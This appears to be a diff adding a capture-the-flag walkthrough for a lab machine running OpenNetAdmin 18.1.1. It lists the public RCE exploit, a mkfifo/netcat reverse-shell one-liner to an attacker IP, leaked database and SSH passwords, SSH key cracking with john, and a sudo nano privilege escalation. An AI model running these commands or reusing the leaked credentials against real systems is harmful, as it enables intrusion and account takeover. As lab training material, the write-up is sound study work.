@@ -1,0 +1,46 @@
+foothold
+========
+1)use OpenNetAdmin 18.1.1 - Remote Code Execution script
+//https://www.exploit-db.com/exploits/47691
+2)dos2unix the script before execute
+3)./47691 http://10.10.10.171/ona/ (perform RCE)
+4)use this to get reverse shell
+(4.1)use php script web base shell
+(4.2)execute the following command to get reverse shell
+rm /tmp/yytga;mkfifo /tmp/yytga;cat /tmp/yytga|/bin/sh -i 2>&1|nc 10.10.15.121 18890 >/tmp/yytga
+
+Users
+=====
+1)www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
+/*
+'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+*/
+2)ssh into jimmy
+jimmy:n1nj4W4rri0R!
+
+User1:jimmy
+-----------
+3)jimmy & joanna in internal group
+find / -group internal 2>/dev/null
+found /var/www/internal dir
+4)check /etc/apache2/sites-available/internal.conf
+//found it's listening to 52846 port
+5)curl 127.0.0.1:52846/main.php
+//gotten id_rsa
+6)crack id_rsa > ssh2john > john(rockyou) 
+7)ssh-add the id_rsa with cracked password
+joanna:bloodninjas
+8)ssh joanna & grab userFlag
+
+root
+----
+1)sudo -l
+//noPassword for: /bin/nano /opt/priv
+2)GTFObins for nano
+//sudo /bin/nano /opt/priv
+3)grab rootFlag
